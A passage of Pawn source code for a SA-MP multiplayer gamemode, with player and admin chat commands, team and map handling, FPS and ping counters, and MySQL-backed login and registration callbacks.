    if(sscanf(params,"u",pID)) return ERRORL("Usage: /fps [playerid]", "PouûÌt: /fps [id]");
    if(!IsPlayerConnected(pID)) return ERRORL("Invalid playerid.", "Neplatn˝ playerid.");
    SCMFL(playerid, -1, "{00A3C0}FPS of %s (ID:%d) is %d", "{00A3C0}FPS z %s (ID:%d) je: %d", gPlayerName(pID), pID, GetPlayerFPS(pID));
  	return 1;
}

CMD:pl(playerid, params[])
{
  if(isnull(params))
  {
  SCMFL(playerid,-1,"{00A3C0}Your PL is: %.2f%s","{00A3C0}Vaöe PL je: %.2f%s", NetStats_PacketLossPercent(playerid), "%%");
  return 1;
  }
  new pID;
  if(sscanf(params,"u",pID)) return ERRORL("Usage: /pl [playerid]", "PouûÌt: /pl [id]");
  if(!IsPlayerConnected(pID)) return ERRORL("Invalid playerid.", "Neplatn˝ playerid.");
  SCMFL(playerid, -1, "{00A3C0}PL of %s (ID:%d) is %.2f%s", "{00A3C0}PL z %s (ID:%d) je: %.2f%s", gPlayerName(pID), pID, NetStats_PacketLossPercent(pID), "%%");
  return 1;
}

CMD:info(playerid, params[])
{
  new string[150];
  if (GetPlayerLanguage(playerid) == LANGUAGE_ENGLISH)
    format(string, sizeof(string), "{00A3C0}Gamemode took 2 days to write.\nHitbox: destiezk's Skinshot Hitbox\nContact: destiezk#3404");
  else if (GetPlayerLanguage(playerid) == LANGUAGE_CZECH)
    format(string, sizeof(string), "{00A3C0}Gamemode trvalo psanÌ 2 dny.\nHitbox: destiezk Skinshot Hitbox\nKontakt: destiezk#3404");
  else
    format(string, sizeof(string), "{00A3C0}Invalid language");
  ShowPlayerDialog(playerid, 2, DIALOG_STYLE_MSGBOX, "Info", string, "OK", "");
  return 1;
}

CMD:cmds(playerid, params[])
{
  ShowPlayerDialog(playerid, 2, DIALOG_STYLE_MSGBOX, "Commands", "{FFFFFF}/respawn  /class  /fps  /pl  /sync  /weather\n/info  /world  /spec  /specoff  /hitsound  /skin  /aka\n/serial  /admins  /time  /lang  /updates" , "OK", "");
  return 1;
}

CMD:acmds(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  ShowPlayerDialog(playerid, 2, DIALOG_STYLE_MSGBOX, "Commands", "{FFFFFF}/team  /setup  /lockteams  /kick  /ban  /map  /setlevel  /teamname\n/type  /start  /stop  /mute  /unmute  /reset  /resetall\n/unban  /speconly  /defweapon  /sampcac  /teamcolor /fpsunlocker  /distancebug  /spawn", "OK", "");
  return 1;
}

CMD:sampcac(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 2) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  if(isnull(params)) return ERRORL("Usage: /sampcac [on | off]", "PouûÌt: /sampcac [on | off]");
  if(!strcmp(params, "on", true))
  {
	  togglesampcac = true;
      SetTimerEx("CheckSAMPCACInstalled", 2000, false, "d", playerid);
      SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has enabled SAMPCAC.", "{00A3C0}Administr·tor %s (ID:%d) povolil SAMPCAC.", gPlayerName(playerid), playerid);
  }
  if(!strcmp(params, "off", true))
  {
	  togglesampcac = false;
      SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has disabled SAMPCAC.", "{00A3C0}Administr·tor %s (ID:%d) zablokoval SAMPCAC.", gPlayerName(playerid), playerid);
  }
  return 1;
}

CMD:weather(playerid, params[])
{
  new idojaras;
  new string[250];
  if(sscanf(params,"i", idojaras)) return ERRORL("Usage: /weather [ID]", "PouûÌt: /weather [id]");
  SetPlayerWeather(playerid, idojaras);
  format(string, sizeof(string),"{00A3C0}Weather changed. ID: %d",idojaras);
  SCMFL(playerid, -1, "{00A3C0}Weather changed. ID: %d","{00A3C0}PoËasÌ se zmÏnilo.. ID: %d",idojaras);
  return 1;
}

CMD:time(playerid, params[])
{
  new ido;
  new string[250];
  if(sscanf(params,"i", ido)) return ERRORL("Usage: /time [ID]", "PouûÌt: /time [id]");
  SetPlayerTime(playerid, ido, 0);
  format(string, sizeof(string),"{00A3C0}Time changed. ID: %d",ido);
  SCMFL(playerid, -1, "{00A3C0}Time changed. ID: %d","{00A3C0}»as se zmÏnil. ID: %d",ido);
  return 1;
}

CMD:kick(playerid, params[])
{
    if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
    new player,reason[128];
    if(sscanf(params, "uS(None)[128]", player, reason)) return ERRORL("Usage: /kick [id] [reason]", "PouûÌt: /kick [id] [d˘vod]");
    new string[300];
    format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has kicked %s (ID:%d). Reason: %s", gPlayerName(playerid), playerid, gPlayerName(player), player, reason);
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has kicked %s (ID:%d). Reason: %s", "{00A3C0}Administr·tor %s (ID:%d) dostal kick %s (ID:%d). D˘vod: %s", gPlayerName(playerid), playerid, gPlayerName(player), player, reason);
    KickPersonWithDelay(player);
    return 1;
}

CMD:lockteams(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  new string[300];
  if (teamslocked == true)
  {
    teamslocked = false;
    format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has unlocked teams.", gPlayerName(playerid), playerid);
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has unlocked teams.", "{00A3C0}Administr·tor %s (ID:%d) odemkl t˝my.", gPlayerName(playerid), playerid);
  }
  else
  {
    format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has locked teams.", gPlayerName(playerid), playerid);
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has locked teams.", "{00A3C0}Administr·tor %s (ID:%d) zamkl t˝my.", gPlayerName(playerid), playerid);
    teamslocked = true;
  }
  return 1;
}

CMD:unban(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 2) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  new ip[16];
  if(sscanf(params, "s[16]", ip)) return ERRORL("Usage: /unban [ip]", "PouûÌt: /unban [ip]");
  new string[76];
  format(string,sizeof(string),"unbanip %s",ip);
  SendRconCommand(string);
  SendRconCommand("reloadbans");
  new string2[300];
  format(string2, sizeof(string2), "{00A3C0}Administrator %s (ID:%d) has unbanned IP %s.", gPlayerName(playerid), playerid, ip);
  SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has unbanned IP %s.", "{00A3C0}Administr·tor %s (ID:%d) dostal unban IP %s.", gPlayerName(playerid), playerid, ip);
  return 1;
}

CMD:ban(playerid, params[])
{
    if (PlayerInfo[playerid][Admin] < 2) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
    new player,reason[128];
    if(sscanf(params, "uS(None)[128]", player, reason)) return ERRORL("Usage: /ban [id] [reason]", "PouûÌt: /ban [id] [d˘vod]");
    new string[300];
    format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has banned %s (ID:%d). Reason: %s", gPlayerName(playerid), playerid, gPlayerName(player), player, reason);
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has banned %s (ID:%d). Reason: %s", "{00A3C0}Administr·tor %s (ID:%d) zabanoval %s (ID:%d). D˘vod: %s", gPlayerName(playerid), playerid, gPlayerName(player), player, reason);
    BanPersonWithDelay(player);
    return 1;
}

CMD:map(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  new option[10];
  new string[256];
  if(sscanf(params, "s[20]", option)) return ERRORL("Usage: /map [air | air2 | base]", "PouûÌt: /map [air | air2 | base]");
  if(!strcmp(option, "air", true))
  {
      gamemap = sfair;
      format(string,sizeof(string), "{00A3C0}Administrator %s (ID:%d) has switched map to SFAIR.", gPlayerName(playerid), playerid);
      SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has switched map to SFAIR.", "{00A3C0}Administr·tor %s (ID:%d) p¯epnul mapu na: SFAIR.", gPlayerName(playerid), playerid);
      for(new i; i < MAX_PLAYERS; i++)
      moveplayertospawn(i);
      return 1;
  }

  if(!strcmp(option, "air2", true))
    {
      gamemap = sfair2;
      format(string,sizeof(string), "{00A3C0}Administrator %s (ID:%d) has switched map to SFAIR2.", gPlayerName(playerid), playerid);
      SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has switched map to SFAIR2.", "{00A3C0}Administr·tor %s (ID:%d) p¯epnul mapu na: SFAIR2.", gPlayerName(playerid), playerid);
      for(new i; i < MAX_PLAYERS; i++)
      moveplayertospawn(i);
      return 1;
    }
  if(!strcmp(option, "base", true))
    {
      gamemap = base;
      format(string,sizeof(string), "{00A3C0}Administrator %s (ID:%d) has switched map to BASE.", gPlayerName(playerid), playerid);
      SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has switched map to BASE.", "{00A3C0}Administr·tor %s (ID:%d) p¯epnul mapu na: BASE.", gPlayerName(playerid), playerid);
      for(new i; i < MAX_PLAYERS; i++)
      moveplayertospawn(i);
      return 1;
    }
  return 1;
}

CMD:team(playerid, params[])
{
	if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
	new options, id, string[300];
	if (sscanf(params, "ii", id, options)) return ERRORL("Usage: /team [playerid] [1-3] [1 - home | 2 -away | 3 - spec]", "PouûÌt: /team [playerid] [1-3] [1 - home | 2 -away | 3 - spec]");
	if (!IsPlayerConnected(id)) return ERRORL("Invalid playerid.", "Neplatn˝ playerid.");
	switch(options)
	{
		case 1:
		{
      SetPlayerColor(id, teamcolor(home));
	  team[id] = home;
	  SpawnPlayer(id);
      TogglePlayerSpectating(id, 0);
	  SetCameraBehindPlayer(id);
	  spectating[id] = false;
		}
		case 2:
		{
      SetPlayerColor(id, teamcolor(away));
	  team[id] = away;
	  SpawnPlayer(id);
      TogglePlayerSpectating(id, 0);
	  SetCameraBehindPlayer(id);
	  spectating[id] = false;
		}
		case 3:
		{
      SetPlayerColor(id, teamcolor(spec));
	  team[id] = spec;
	  SpawnPlayer(id);
      TogglePlayerSpectating(id, 0);
  	  SetCameraBehindPlayer(id);
  	  spectating[id] = false;
  	  if (speconly)
	  {
      TextDrawHideForPlayer(playerid, FPSSzamlalo[playerid]);
	  TextDrawHideForPlayer(playerid, Pingszamlalo[playerid]);
	  }
		}
	}
	format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has moved %s (ID:%d) to team %s.", gPlayerName(playerid), playerid, gPlayerName(id), id, teamname[team[id]]);
	SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has moved %s (ID:%d) to team %s.", "{00A3C0}Administr·tor %s (ID:%d) p¯esunul %s (ID:%d) do t˝mu %s.", gPlayerName(playerid), playerid, gPlayerName(id), id, teamname[team[id]]);
	return 1;
}

CMD:setlevel(playerid, params[])
{
	new string[300], selected, level, string2[100];
	if(!IsPlayerAdmin(playerid)) return ERRORL("You are not allowed to use this command.", "Pro tento p¯Ìkaz nem·te povolenÌ.");//SendClientMessage(playerid,0xFF0000AA,"You can't use this command.");
	if(sscanf(params,"ii",selected,level)) return ERRORL("Usage: /setlevel [playerid] [0-2]", "PouûÌt: /setlevel [id] [0-2]");//SCM(playerid,0xFF0000FF,"SERVER: {FFFFFF} /setlevel [ID] [0-2]");
	if(!IsPlayerConnected(selected)) return ERRORL("Invalid playerid.", "Neplatn˝ playerid");
	if(level > 2 || level < 0) return ERRORL("Usage: /setlevel [playerid] [0-2]", "PouûÌt: /setlevel [id] [0-2]");
	new query[140];
	mysql_format(Database, query, sizeof(query), "UPDATE `users` SET `Admin` = '%d' WHERE `ID` = '%d'", level, PlayerInfo[selected][ID]);
	// We will format the query to save the player and we will use this as soon as a player disconnects.
	mysql_tquery(Database, query); //We will execute the query.
	format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has promoted %s (ID:%d) to Admin. (Level: %d)", gPlayerName(playerid), playerid, gPlayerName(selected), selected, level);
    format(string2, sizeof(string2), "{00A3C0}You have been promoted to Level %d Admin.", level);
	SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has promoted %s (ID:%d) to Admin. (Level: %d)", "{00A3C0}Administr·tor %s (ID:%d) pov˝öil %s (ID:%d) na Spr·vche. (Level: %d)", gPlayerName(playerid), playerid, gPlayerName(selected), selected, level);
    SCMFL(selected, -1, "{00A3C0}You have been promoted to Level %d Admin.", "{00A3C0}Byl jste pov˝öen na ˙roveÚ %d Spr·vce.", level);
    PlayerInfo[selected][Admin] = level;
	return 1;
}

CMD:class(playerid, params[]) //parancs ha beirja hogy /class akkor feldobja a csapat v√É¬°laszt√É¬≥ dialogot
{
  new string[180], allstring[90];
  format(string, sizeof(string), "%s\n%s\n{FFFF00}%s", teamname[0], teamname[1], teamname[2]);
  ShowPlayerDialog(playerid, 1, DIALOG_STYLE_LIST, "Team Selection", string, "Select", "");
  format(allstring, sizeof(allstring), "{00A3C0}%s (ID:%d) is in Class selection now.", gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{00A3C0}%s (ID:%d) is in Class selection now.", "{00A3C0}%s (ID:%d) je nynÌ ve v˝bÏru teamu.", gPlayerName(playerid), playerid);
  return 1;
}

CMD:type(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  new string[180];
  score = score == true ? false : true;
  format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has %s score.", gPlayerName(playerid),playerid, score == true ? ("enabled") : ("disabled"));
  if (score)
     SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has enabled score.", "{00A3C0}Administr·tor %s (ID:%d) povoleno score.", gPlayerName(playerid),playerid);
  else
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has disabled score.", "{00A3C0}Administr·tor %s (ID:%d) zak·z·no score.", gPlayerName(playerid),playerid);
  for(new i; i < MAX_PLAYERS; i++) {
  updatetextdraw(i);
  SetPlayerVirtualWorld(i, 0);
  }
  return 1;
}

CMD:speconly(playerid, params[])
{
  #define ForCWPlayers(%0) for(new %0; %0 <= MAX_PLAYERS;%0++) if(IsPlayerConnected(%0)&&!GetPlayerVirtualWorld(%0))
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  speconly = !speconly;
  if (speconly)
     SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has enabled speconly.", "{00A3C0}Administr·tor %s (ID:%d) povoleno speconly", gPlayerName(playerid),playerid);
  else
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has disabled speconly.", "{00A3C0}Administr·tor %s (ID:%d) zak·z·no speconly", gPlayerName(playerid),playerid);
  if (speconly == true)
  {
      ForCWPlayers(i)
      {
        if (team[i] == spec)
        {
            new id;
            id = lowestplayer();
            TogglePlayerSpectating(i, 1);
            PlayerSpectatePlayer(i, id);
            SpecID[i] = id;
            spectating[i] = true;
            TextDrawHideForPlayer(playerid, FPSSzamlalo[playerid]);
  			TextDrawHideForPlayer(playerid, Pingszamlalo[playerid]);
        }
      }
  }
  return 1;
}

CMD:spec(playerid, params[])
{
  new id;
  if(sscanf(params, "d", id)) return ERRORL("Usage: /spec [id]", "PouûÌt: /spec [id]");
  if(id == INVALID_PLAYER_ID) return ERRORL("Invalid playerid.", "Neplatn˝ playerid.");
  if(!IsPlayerConnected(id)) return ERRORL("Invalid playerid.", "Neplatn˝ playerid.");
  spectating[playerid] = true;
//  if (spectating[playerid] == true) return ERROR("You are already spectating someone.");
  specplayer(playerid, id);
  SpecID[playerid] = id;
  return 1;
}

CMD:specoff(playerid, params[])
{
  if(speconly == true) return ERRORL("You can't quit spectating, spectating only mode is turned on.", "Sledov·nÌ nem˘ûete skonËit, je zapnut˝ reûim pouze sledov·nÌ.");
  TogglePlayerSpectating(playerid, 0);
  SetCameraBehindPlayer(playerid);
  spectating[playerid] = false;
  return 1;
}

CMD:teamcolor(playerid, params[])
{
    if (PlayerInfo[playerid][Admin] < 1)
        return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");

    if(isnull(params))
        return ERRORL("Usage: /teamcolor [home | away]", "PouûitÌ: /teamcolor [home | away]");

    if(!strcmp(params, "home", true))
    {
        gRememberedTeam[playerid] = home;
    }
    else if(!strcmp(params, "away", true))
    {
        gRememberedTeam[playerid] = away;
    }
    else
    {
        return ERRORL("Usage: /teamcolor [home | away]", "PouûitÌ: /teamcolor [home | away]");
    }

	new caption[30];
	format(caption, sizeof(caption), "Team colors for Team %s", teamname[gRememberedTeam[playerid]]);
    ShowPlayerDialog(playerid, 0, DIALOG_STYLE_LIST, caption, "Red\nGreen\nBlue\nWhite\nYellow\nPurple\nBlack", "OK", "Exit");

    return 1;
}

CMD:teamname(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  new teamx, newname[16], string[100], str[30];
  format(string, sizeof(string), "{FF0000}Usage: /teamname [1/2] [name]");
  if (sscanf(params, "is[16]", teamx, newname)) return SendClientMessage(playerid, -1, string);
  format(teamname[teamx - 1], 15, "%s", newname);
  format(str, sizeof(str), "[%s] vs [%s]", teamname[home], teamname[away]);
  for(new i; i < MAX_PLAYERS; i++)
  updatetextdraw(i);
  SetGameModeText(str);
  if(teamx == 1) SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has changed Green to %s.", "{00A3C0}Administr·tor %s (ID:%d) zmÏnil Green na %s.", gPlayerName(playerid),playerid, teamname[home]);
  if(teamx == 2) SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has changed Red to %s.", "{00A3C0}Administr·tor %s (ID:%d) zmÏnil Red na %s.", gPlayerName(playerid),playerid, teamname[away]);
  return 1;
}

CMD:setup(playerid, params[])
{
if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
new sroundscore;
new srounds;
if (sscanf(params, "ii", srounds, sroundscore)) return ERRORL("Usage: /setup [rounds] [roundscore]", "PouûÌt: /setup [rounds] [max score]");
if (sroundscore < 1 || sroundscore > 9999) return ERRORL("You must set the roundscore between 1 and 9999.", "MusÌte nastavit roundscore mezi 1 a 9999.");
if (srounds < 1 || srounds > 10) return ERRORL("You must set rounds between 1 and to 10.", "MusÌte nastavit kola mezi 1 a 10.");
rounds = srounds;
roundscore = sroundscore;
new string[300];
format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has set the game up to %dx%d.", gPlayerName(playerid), playerid, rounds, roundscore);
SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has set the game up to %dx%d.", "{00A3C0}Administr·tor %s (ID:%d) nastavil hru na %dx%d.", gPlayerName(playerid), playerid, rounds, roundscore);
for(new i; i < MAX_PLAYERS; i++)
	updatetextdraw(i);
return 1;
}

//Funkci√É¬≥k
moveplayertospawn(playerid) //megn√É¬©zz√É¬ºk milyen cspatban van, majd oda helyezz√É¬ºk a spawn hely√É¬©re
{
  switch(gamemap)
  {
  case sfair:
  {
  if(team[playerid] == home) {
      SetPlayerPos(playerid, -1331.5000,-40.4000,14.1484);
      SetPlayerFacingAngle(playerid,221.6484);
      SetCameraBehindPlayer(playerid);
  }
  if(team[playerid] == away) {
      SetPlayerPos(playerid,-1190.0000,-181.9000,14.1484);
      SetPlayerFacingAngle(playerid,41.5168);
      SetCameraBehindPlayer(playerid);
  }
  if(team[playerid] == spec) {
        SetPlayerPos(playerid, -1228.5099, -78.5593, 27.3794);
        SetPlayerFacingAngle(playerid, 135.9327);
        SetCameraBehindPlayer(playerid);
    }
  }
  case sfair2:
  {
    if(team[playerid] == home) {
        SetPlayerPos(playerid, -1400.9797,-198.6838,14.1462);
        SetPlayerFacingAngle(playerid, 218.8042);
        SetCameraBehindPlayer(playerid);
    }
    if(team[playerid] == away) {
      SetPlayerPos(playerid, -1316.3982,-284.0807,14.1484);
      SetPlayerFacingAngle(playerid, 42.6809);
      SetCameraBehindPlayer(playerid);
    }
    if(team[playerid] == spec) {
        SetPlayerPos(playerid,-1380.0521,-264.8761,28.9857);
        SetPlayerFacingAngle(playerid,315.6964);
        SetCameraBehindPlayer(playerid);
    }
  }
  case base:
  {
    if(team[playerid] == home) {
  SetPlayerPos(playerid, 1390.2596, 2191.7654, 11.0234);
  SetPlayerFacingAngle(playerid, 139.8929);
  SetCameraBehindPlayer(playerid);
    }
    if(team[playerid] == away) {
    SetPlayerPos(playerid, 1305.4670, 2107.2490, 11.0156);
    SetPlayerFacingAngle(playerid, 312.5179);
    SetCameraBehindPlayer(playerid);
    }
    if(team[playerid] == spec) {
    SetPlayerPos(playerid, 1410.4636,2165.7034,18.5314);
    SetPlayerFacingAngle(playerid, 90.3587);
    SetCameraBehindPlayer(playerid);
  }
  }
}
}

updatetextdraw(playerid)
{
  new scorestring[30];
  if(score == true)
    format(scorestring, sizeof(scorestring), "~w~Type: ~r~Score  ");
  else
    format(scorestring, sizeof(scorestring), "~w~Type: ~r~Free  ");
  new string[2500];
  format(string, sizeof(string),
  "%s%s ~w~vs. %s%s  " \
  "~w~Score: %s%02d~w~:%s%02d  " \
  "~w~Total: %s%02d~w~:%s%02d  " \
  "~w~Rounds: %s%02d~w~:%s%02d  " \
  "%s"   \
  "~w~Damage: ~r~%0.2f  " \
  "~w~Kills: ~r~%d  " \
  "~w~Deaths: ~r~%d",
  gTeamTextdrawColors[gColorHome], teamname[home], gTeamTextdrawColors[gColorAway], teamname[away],
  gTeamTextdrawColors[gColorHome], teamscore[home], gTeamTextdrawColors[gColorAway], teamscore[away],
  gTeamTextdrawColors[gColorHome], totalscore[home], gTeamTextdrawColors[gColorAway], totalscore[away],
  gTeamTextdrawColors[gColorHome], teamrounds[home], gTeamTextdrawColors[gColorAway], teamrounds[away],
  scorestring,
  PlayerInfo[playerid][pDamage],
  kills[playerid],
  deaths[playerid]
  );

  TextDrawSetString(Textdraw0[playerid], string);
}

main()
{
  printf("SAMPCAC Version: %d.%d.%d", CAC_INCLUDE_MAJOR, CAC_INCLUDE_MINOR, CAC_INCLUDE_PATCH); //kiiratjuk faszom sampcac verzi√É¬≥j√É¬°t a serverlogba mert nem akarunk warningot
  print("SAMP Gamemode made by destiezk | For any questions contact me: destiezk#3404");
}

stock teamcolor(teamc)
{
  new color;
  if(teamc == home) color = 0x32CD32AA;
  else if(teamc == away) color = 0xAA3333AA;
  else color = 0xFFFF00AA;
  return color;
}

stock gPlayerName(playerid) //player nev√É¬©nek lek√É¬©r√É¬©se funkci√É¬≥
{
	new pnameid[24];
	GetPlayerName(playerid,pnameid,sizeof(pnameid));
	return pnameid;
}
public OnPlayerUpdate(playerid)
{

  // handle fps counters.
  new drunknew;
  drunknew = GetPlayerDrunkLevel(playerid);

  if (drunknew < 100) { // go back up, keep cycling.
      SetPlayerDrunkLevel(playerid, 2000);
  } else {

      if (pDrunkLevelLast[playerid] != drunknew) {

          new wfps = pDrunkLevelLast[playerid] - drunknew;

          if ((wfps > 0) && (wfps < 400))
              pFPS[playerid] = wfps;

          pDrunkLevelLast[playerid] = drunknew;
      }

  }
  
  new string[50];
  format(string, 50, "~w~FPS ~r~%d",pFPS[playerid]);
  TextDrawSetString(FPSSzamlalo[playerid],string);
  new string2[70];
  format(string2, 70, "~w~Ping ~r~%d",GetPlayerPing(playerid));
  TextDrawSetString(Pingszamlalo[playerid],string2);

  return 1;

}

public OnPlayerText(playerid, text[])
{
  if (GetPVarInt(playerid, "Mute"))
  {
    ERRORL("{FF0000}You can't send a message, you are muted.", "{FF0000}Nem˘ûete odeslat zpr·vu, jste umlËeni.");
    return 0;
  }
  if (text[0] == '#')
  {
      if (PlayerInfo[playerid][Admin] > 0)
      {
          HandleAdminChat(playerid, text[1]);
          return 0;
      }
  }
  else if (text[0] == '!')
  {
    HandleTeamChat(playerid, text[1]);
    return 0;
  }
  return 1;
}

stock HandleAdminChat(playerid, const text[])
{
  new message[256];
  format(message, sizeof(message), "[AdminChat] %s (ID:%d): %s", gPlayerName(playerid), playerid, text);
  for(new i = 0; i < MAX_PLAYERS; i++)
  {
    if(IsPlayerConnected(i) == 1)
    {
      if(PlayerInfo[i][Admin] > 0)
      {
        SendLongMessage(i, 0x32CD32AA, message);//  SCMF(i, -1, "{00A3C0}[TeamChat] %s (ID: %d): %s", gPlayerName(playerid), playerid, text);
      }
    }
  }
}

stock HandleTeamChat(playerid, const text[])
{
    new message[256];
    format(message, sizeof(message), "{00A3C0}[TeamChat] %s (ID:%d): %s", gPlayerName(playerid), playerid, text);
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
      if(team[i] == team[playerid])
      {
        SendLongMessage(i, 0x00A3C0FF, message);
      }
    }
}

forward CheckPlayer(playerid);
public CheckPlayer(playerid)
{
    new rows, string[150];
    cache_get_row_count(rows);

    if(rows) // If row exists
    {
        cache_get_value_name(0, "Password", PlayerInfo[playerid][Password], 129); // Load the player's password
        cache_get_value_name_int(0, "ID", PlayerInfo[playerid][ID]); // Load the player's ID.
        format(string, sizeof(string), "Please type your password below to login to your account."); // A dialog will pop up telling the player to write they password below to login.
        ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "Login", string, "Login", "Exit");
    }
    else // If there are no rows, we need to show the register dialog!
    {
        format(string, sizeof(string), "Please register below in case you want to play here."); // A dialog with this note will pop up telling the player to register his acocunt.
        ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "Register", string, "Register", "Exit");
    }
    return 1;
}

forward LoadPlayer(playerid);
public LoadPlayer(playerid)
{
		new string[300];
        cache_get_value_name_int(0, "Admin", PlayerInfo[playerid][Admin]);
		if(PlayerInfo[playerid][Admin] > 0)
		{
		format(string, sizeof(string), "{FF0000}Administrator %s (ID:%d) has logged in. Level: %d", gPlayerName(playerid), playerid, PlayerInfo[playerid][Admin]);
		SCMTAFL(-1, "{FF0000}Administrator %s (ID:%d) has logged in. Level: %d", "{FF0000}Administr·tor %s (ID:%d) se p¯ipojil. Level: %d", gPlayerName(playerid), playerid, PlayerInfo[playerid][Admin]);
    	SCML(playerid, -1, "{00A3C0}You have successfully logged in. Welcome back!", "{00A3C0}⁄spÏönÏ p¯ipojen. VÌtej zpÏt!");
		}
		else
		{
		format(string, sizeof(string), "{00A3C0}You have successfully logged in. Welcome back!");
		SCML(playerid, -1, "{00A3C0}You have successfully logged in. Welcome back!", "{00A3C0}⁄spÏönÏ p¯ipojen. VÌtej zpÏt!");
		}
        return 1;
}

stock GetPlayerFPS(playerid)
{
  new drunknew = GetPlayerDrunkLevel(playerid);

  if (drunknew < 100) { // go back up, keep cycling.
    SetPlayerDrunkLevel(playerid, 2000);
  } else {

    if (pDrunkLevelLast[playerid] != drunknew) {

        new wfps = pDrunkLevelLast[playerid] - drunknew;

        if ((wfps > 0) && (wfps < 400))
            pFPS[playerid] = wfps;

        pDrunkLevelLast[playerid] = drunknew;
    }

}
  return pFPS[playerid];
}

forward SavePlayer(playerid);
public SavePlayer(playerid)
{
    new query[140];
    mysql_format(Database, query, sizeof(query), "UPDATE `users` SET `Admin` = '%d' WHERE `ID` = '%d'", PlayerInfo[playerid][Admin], PlayerInfo[playerid][ID]);
    // We will format the query to save the player and we will use this as soon as a player disconnects.
    mysql_tquery(Database, query); //We will execute the query.
    return 1;
}

forward RegisterPlayer(playerid);
public RegisterPlayer(playerid)
{
    PlayerInfo[playerid][ID] = cache_insert_id();
    printf("A new account with the id of %d has been registered!", PlayerInfo[playerid][ID]); // You can remove this if you want, I just used it to debug.
    return 1;
}
new Count = -1;
forward CountDownPublic();
public CountDownPublic()
{
	if (Count > 0)
	{
		new str[10];
		format(str, 10, "%d", Count);
		Count--;
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    GameTextForPlayer(i, str, 1000, 5);
			PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0);
		}
		SetTimer("CountDownPublic", 1000, false);
	}
	else
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
